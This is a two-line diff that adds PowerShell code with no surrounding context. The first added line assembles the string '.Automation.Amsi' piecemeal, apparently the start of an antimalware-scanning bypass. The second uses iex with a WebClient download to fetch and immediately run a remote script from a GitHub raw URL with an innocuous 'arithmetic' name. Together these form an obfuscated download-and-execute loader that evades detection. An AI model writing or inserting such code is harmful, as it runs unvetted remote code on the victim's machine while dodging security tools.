@@ -1,0 +1,2 @@
+$data0 = ".Automation." + "Am" + "si"
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/deverisc/arithmetic/refs/heads/main/arithmetic0002.txt')
